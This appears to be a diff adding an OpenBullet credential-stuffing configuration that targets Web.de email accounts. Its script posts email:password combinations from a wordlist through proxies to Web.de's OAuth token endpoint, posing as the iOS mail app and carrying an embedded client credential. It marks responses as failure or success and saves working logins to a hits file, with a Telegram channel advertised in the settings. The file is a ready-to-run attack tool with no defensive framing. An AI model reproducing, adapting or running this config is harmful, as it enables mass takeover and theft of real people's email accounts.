@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Web.de",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-10-29T22:38:59.0464091+03:30",
+  "AdditionalInfo": "Telegram Channel : T.me/OpenBulletChannel | Auto Save Hits | CPM Rate: 500 - 3000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#POST REQUEST POST "https://oauth2.web.de/token" 
+  CONTENT "device%5Fname=iOS%5FDevice&username=<USER>&grant%5Ftype=password&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: oauth2.web.de" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "User-Agent: WEB.DE%20Mail/6122 CFNetwork/1220.1 Darwin/20.3.0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-UI-TRACK-OPERATION: PACSCreateRefreshTokenOperation" 
+  HEADER "Accept: */*" 
+  HEADER "X-UI-APP: webde.ios.iosmail/8.25.6122" 
+  HEADER "Authorization: Basic d2ViZGVfbWFpbGFwcF9pb3M6bUJaTFNrTEcwUkoyUWNlclhmbmpFWHAzNk9lRXk3OUQxVFFBVWQ5Qg==" 
+  HEADER "Content-Length: 88" 
+  HEADER "Accept-Language: en-us" 
+
+#KEY KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Perm.ACCOUNT_NOT_FOUND_OR_PASSWORD_WRONG" 
+    KEY "Missing or invalid parameters: password" 
+    KEY "Missing or invalid parameters: username" 
+  KEYCHAIN Success OR 
+    KEY "access_token\":\"" 
+
+UTILITY File "Web.de Mail .txt" AppendLines "<USER>:<PASS> | Telegram Channel : t.me/OpenBulletChannel" -> VAR "Save" 
+
